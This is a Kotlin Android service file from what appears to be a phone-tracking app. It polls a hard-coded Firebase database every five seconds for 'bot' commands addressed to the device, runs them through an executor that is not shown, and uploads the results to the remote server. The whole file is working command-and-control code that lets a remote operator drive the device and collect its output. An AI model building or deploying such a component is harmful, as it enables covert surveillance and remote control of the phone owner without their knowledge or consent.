package com.abuzahra.tracker.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.abuzahra.tracker.CommandExecutor
import com.abuzahra.tracker.SharedPrefsManager
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

/**
 * FirebaseCommandService - خدمة الاستماع لأوامر Firebase
 * تستمع لأوامر البوت من Firebase RTDB وتنفذها فوراً
 */
class FirebaseCommandService : Service() {

    companion object {
        private const val TAG = "FirebaseCmdService"
        private const val NOTIFICATION_ID = 2
        private const val CHANNEL_ID = "firebase_cmd_channel"
        private const val FIREBASE_RTDB_URL = "https://studio-7073076148-6afe0-default-rtdb.firebaseio.com"
        private const val POLL_INTERVAL = 5000L // 5 seconds
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "تم إنشاء خدمة استماع Firebase")
        startForegroundNotification()
        startFirebasePolling()
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(CHANNEL_ID, "Firebase Commands", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Firebase Command Listener")
            .setContentText("Listening for commands...")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .build()
        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startFirebasePolling() {
        serviceScope.launch {
            Log.d(TAG, "بدء استطلاع Firebase للأوامر...")
            while (isActive) {
                try {
                    pollFirebaseCommands()
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في استطلاع Firebase: ${e.message}")
                }
                delay(POLL_INTERVAL)
            }
        }
    }

    private suspend fun pollFirebaseCommands() {
        val deviceId = SharedPrefsManager.getDeviceId(this@FirebaseCommandService) ?: return
        
        try {
            // GET commands/{deviceId} from Firebase
            val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId.json")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            connection.instanceFollowRedirects = true
            
            val responseCode = connection.responseCode
            if (responseCode != 200) {
                Log.w(TAG, "Firebase GET commands returned: $responseCode")
                connection.disconnect()
                return
            }
            
            val response = connection.inputStream?.bufferedReader()?.use { it.readText() } ?: "{}"
            connection.disconnect()
            
            val commandsObj = JSONObject(response)
            if (commandsObj.length() == 0) {
                return
            }
            
            Log.d(TAG, "Firebase: وجد ${commandsObj.length()} أوامر")
            
            val keys = commandsObj.keys()
            for (cmdId in keys) {
                try {
                    val cmdObj = commandsObj.getJSONObject(cmdId)
                    val status = cmdObj.optString("status", "pending")
                    
                    if (status != "pending") continue
                    
                    val command = cmdObj.getString("command")
                    val params = cmdObj.optJSONObject("params") ?: JSONObject()
                    
                    Log.d(TAG, "Firebase: تنفيذ الأمر $command (id=$cmdId)")
                    
                    // Mark as processing in Firebase
                    markCommandProcessing(deviceId, cmdId)
                    
                    // Execute the command
                    val result = CommandExecutor.execute(this@FirebaseCommandService, command, params)
                    Log.d(TAG, "نتيجة الأمر $command: ${result.take(200)}")
                    
                    // Write result to Firebase
                    writeResultToFirebase(deviceId, cmdId, command, result)
                    
                    // Also delete the command from Firebase after execution
                    deleteCommandFromFirebase(deviceId, cmdId)
                    
                } catch (e: Exception) {
                    Log.e(TAG, "خطأ في معالجة الأمر: ${e.message}")
                    // Write error result
                    writeResultToFirebase(deviceId, cmdId, "error", """{"ok":false,"error":"${e.message}"}""")
                    deleteCommandFromFirebase(deviceId, cmdId)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في pollFirebaseCommands: ${e.message}")
        }
    }

    private fun markCommandProcessing(deviceId: String, cmdId: String) {
        serviceScope.launch {
            try {
                val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId/$cmdId/status.json")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "PUT"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true
                connection.connectTimeout = 5000
                connection.readTimeout = 5000
                connection.outputStream.write("\"processing\"".toByteArray())
                connection.outputStream.flush()
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في تحديث حالة الأمر: ${e.message}")
            }
        }
    }

    private fun writeResultToFirebase(deviceId: String, cmdId: String, command: String, result: String) {
        serviceScope.launch {
            try {
                val resultObj = JSONObject()
                resultObj.put("command", command)
                resultObj.put("result", result)
                resultObj.put("status", "completed")
                resultObj.put("timestamp", System.currentTimeMillis())
                
                val url = URL("$FIREBASE_RTDB_URL/results/$deviceId/$cmdId.json")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "PUT"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true
                connection.connectTimeout = 10000
                connection.readTimeout = 10000
                connection.outputStream.write(resultObj.toString().toByteArray(Charsets.UTF_8))
                connection.outputStream.flush()
                
                val responseCode = connection.responseCode
                connection.disconnect()
                Log.d(TAG, "كتابة النتيجة في Firebase: $responseCode (cmd=$cmdId)")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في كتابة النتيجة: ${e.message}")
            }
        }
    }

    private fun deleteCommandFromFirebase(deviceId: String, cmdId: String) {
        serviceScope.launch {
            try {
                val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId/$cmdId.json")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "DELETE"
                connection.connectTimeout = 5000
                connection.readTimeout = 5000
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في حذف الأمر من Firebase: ${e.message}")
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        Log.d(TAG, "تم تدمير خدمة Firebase")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
